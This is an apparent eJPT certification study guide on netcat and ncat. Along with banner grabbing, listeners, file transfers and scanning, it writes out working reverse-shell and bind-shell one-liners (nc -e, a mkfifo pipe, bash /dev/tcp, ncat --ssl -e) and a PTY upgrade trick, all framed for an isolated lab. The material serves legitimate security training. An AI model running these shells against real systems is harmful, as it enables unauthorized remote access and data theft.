# Netcat Essentials

> `01-Fundamentals/eJPT` · tools — INE-Cybersecurity-Certifications-Guide

Netcat is the "TCP/IP Swiss Army knife": it reads and writes raw data across network
connections. On Kali you normally have **ncat** (from the Nmap project, command
`ncat`) and possibly a traditional/OpenBSD `nc`. This guide covers the classic use
cases and calls out where `ncat` differs.

> Build differences matter. Some netcat builds lack `-e` (execute), some syntaxes
> differ, and Windows ships no netcat at all. When a drill needs a specific behavior,
> prefer `ncat`, which is guaranteed on Kali (`sudo apt install ncat`).

## Connecting to a service

```bash
# Connect to a port (e.g., banner of a web or FTP server)
nc -nv 10.0.0.6 21

# Verbose + no DNS resolution (-n avoids slow reverse lookups)
nc -vn 10.0.0.6 80

# Send an HTTP request and read the response
printf 'GET / HTTP/1.0\r\n\r\n' | nc -w 3 10.0.0.6 80 | head -20

# ncat version of the same
printf 'GET / HTTP/1.0\r\n\r\n' | ncat 10.0.0.6 80
```

## Listening (a simple server)

```bash
# Listen on port 4444 and print whatever arrives
nc -lvnp 4444

# Flags: -l listen, -v verbose, -n no DNS, -p local port
# Some builds accept the port without -p: nc -lvn 4444

# UDP listener
nc -luvnp 5353
```

If you pipe the listener's input/output to a program you have built a tiny network
service — which is exactly how bind shells work.

## Reverse shells

A **reverse shell** makes the target connect back to you, which bypasses inbound
firewalls. Attacker side first:

```bash
# Attacker (your Kali): listen
nc -lvnp 4444
```

Target side options (Linux):

```bash
# If the target's netcat supports -e (traditional nc and ncat do)
nc -e /bin/bash 10.0.0.5 4444
ncat -e /bin/bash 10.0.0.5 4444

# Portable no -e alternative with a named pipe (works on OpenBSD nc)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f

# No netcat at all? Bash has a built-in TCP device (Linux only)
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
```

Windows target:

```powershell
# Using a netcat binary that supports -e (e.g., ncat.exe)
ncat.exe 10.0.0.5 4444 -e cmd.exe
```

The shell you get is a raw pipe — no job control, no tab completion. Upgrade it on the
attacker side after the session lands:

```bash
# Inside the plain shell, spawn a real PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then on the attacker: press Ctrl+Z, run the two lines below, then fg
stty raw -echo
fg
```

## Bind shells

A **bind shell** listens on the target; you connect to it. Use it when the target can
receive inbound connections (same lab subnet).

```bash
# Target (Linux): open a shell on port 4444
nc -lvnp 4444 -e /bin/bash
# or
ncat -lvnp 4444 -e /bin/bash

# Attacker: connect to the target
nc -nv 10.0.0.6 4444
```

Windows target: `ncat -lvnp 4444 -e cmd.exe`.

Bind shells are easy to spot by defenders and often blocked by firewalls; reverse
shells are the default choice in labs.

## File transfers

Netcat moves files with plain stdin/stdout redirection.

```bash
# Direction 1: attacker listens, target sends
#   Attacker:
nc -lvnp 4444 > received.tar.gz
#   Target:
nc -w 3 10.0.0.5 4444 < data.tar.gz
#   (OpenBSD nc: use -q 1 instead of -w so it closes after EOF)

# ncat: cleaner half-close behavior
#   Attacker:
ncat -lvnp 4444 --recv-only > received.tar.gz
#   Target:
ncat 10.0.0.5 4444 --send-only < data.tar.gz

# Direction 2: target listens, attacker pushes
#   Target:
nc -lvnp 4444 > shell.elf
#   Attacker:
nc -w 3 10.0.0.6 4444 < shell.elf
```

Netcat gives **no progress bar and no integrity check** — verify with `md5sum` or
`sha256sum` on both ends, and be careful the file is not truncated (that is what
`--send-only` / `-q` fix).

## Simple port scanning

Netcat is a poor man's scanner: handy when Nmap is unavailable, but slow and noisy.

```bash
# -z = zero I/O (only check connectability), -w 1 = 1s timeout per port
nc -zv -w 1 10.0.0.6 22 80 443 445
nc -zv -w 1 10.0.0.6 20-30        # port range (build dependent)

# UDP check
nc -zuv -w 1 10.0.0.6 53
```

For real reconnaissance use Nmap (`tools/nmap-cheatsheet.md`). Netcat scanning is only
a fallback.

## ncat differences you should know

ncat (Nmap project) adds modern features over classic netcat:

| Feature | Example | Why it matters |
|---|---|---|
| TLS encryption | `ncat --ssl -lvnp 4444` | Encrypts the channel; server auto-generates an ephemeral cert if none is supplied with `--ssl-cert`/`--ssl-key` |
| TLS client verify | `ncat --ssl --ssl-verify host 443` | Verifies the server certificate |
| Keep listening | `ncat -k -lvnp 4444` | After a client disconnects, keeps listening for more (`-k`/`--keep-open`) |
| Multi-client relay | `ncat --broker --keep-open -lvnp 9000` | Relays between many connected clients (chat / command fan-out) |
| Access control | `ncat -lvnp 4444 --allow 10.0.0.5` | Only accepts from given IP/CIDR; also `--deny` |
| Proxy support | `ncat --proxy 10.0.0.9:8080 --proxy-type http host 80` | Routes through HTTP/SOCKS proxies |
| Half-close control | `--send-only`, `--recv-only` | Clean file transfers without hanging |
| Execute | `-e` / `--exec <cmd>`, `-c`/`--sh-exec` | Spawn a program on connect (reverse/bind shells) |

Worked examples:

```bash
# Encrypted reverse-shell channel (both sides must use --ssl)
#   Attacker listener:
ncat --ssl -lvnp 4444
#   Target:
ncat --ssl -e /bin/bash 10.0.0.5 4444

# Keep-alive service: every connection gets a fresh shell
ncat -k -lvnp 4444 -e /bin/bash
```

## Common Mistakes & Tips

- **Listener flags order.** `-l` must not be combined wrongly with `-p` on some builds;
  the widely compatible form is `nc -lvnp PORT`. If a build rejects it, try
  `nc -l -p PORT` or put the port after `-l` without `-p`.
- **No `-e` on the target's netcat.** OpenBSD-style `nc` often drops `-e`. Use the
  named-pipe one-liner, `ncat -e`, or the bash `/dev/tcp` one-liner instead.
- **Wrong IP direction.** In a reverse shell the *target* dials your `LHOST`; in a bind
  shell *you* dial the target. Double-check who listens where.
- **File transfer truncation.** Without `-q`/`--send-only` the connection may hang or cut
  early. Always checksum the file afterward.
- **Plaintext traffic.** Classic netcat sends everything in cleartext — fine in an
  isolated lab, but use `ncat --ssl` when privacy matters.
- **Interactive shell pain.** A raw `nc` shell has no PTY; run the `python3 -c 'import
  pty…'` upgrade for a usable shell.
- **Using nc for real scans.** It is slow and easily logged — Nmap exists for a reason.
- **Testing against non-lab hosts.** Only run shells/file-transfer drills inside your own
  virtual network.

## Checklist / Self-Test

- [ ] I can connect to a service and grab its banner with `nc`/`ncat`.
- [ ] I can set up a listener (`nc -lvnp PORT`) and explain each flag.
- [ ] I can create a reverse shell from a Linux target and catch it.
- [ ] I can upgrade the raw shell to a PTY with the `python3 -c 'import pty…'` trick.
- [ ] I can set up and connect to a bind shell.
- [ ] I can transfer a file in both directions and verify it with a checksum.
- [ ] I can use `ncat --ssl` and `ncat -k` and explain when to use them.
- [ ] I know at least one `-e`-free reverse-shell technique.

## Further Resources

- Ncat manual (Nmap project): <https://nmap.org/book/ncat-man.html>
- Ncat overview page: <https://nmap.org/ncat/>
- OpenBSD netcat man page: <https://man.openbsd.org/nc.1>
- Nmap official documentation (parent project): <https://nmap.org/docs.html>
